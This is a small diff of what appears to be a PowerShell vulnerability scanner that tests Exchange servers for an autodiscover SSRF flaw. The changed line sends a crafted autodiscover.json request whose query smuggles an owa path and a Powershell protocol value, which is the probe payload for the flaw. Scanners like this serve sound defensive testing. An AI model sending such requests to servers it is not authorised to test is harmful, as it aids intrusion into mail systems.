@@ -20,7 +20,7 @@ Write-host "Running autodiscover SSRF test..." -ForegroundColor Cyan
 try
 {
 write-host "testing site..." -ForegroundColor Gray
-$webtest2 = invoke-webrequest -uri "https://$target/autodiscover/autodiscover.json?scanner4329@pwnstar.local/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
+$webtest2 = invoke-webrequest -uri "https://$target/autodiscover/autodiscover.json?scanner4329@pwnstar.local/owa/&Email=autodiscover/autodiscover.json?b@small.local&Protocol=HACKER&Protocol=Powershell"
 }
 catch
 {
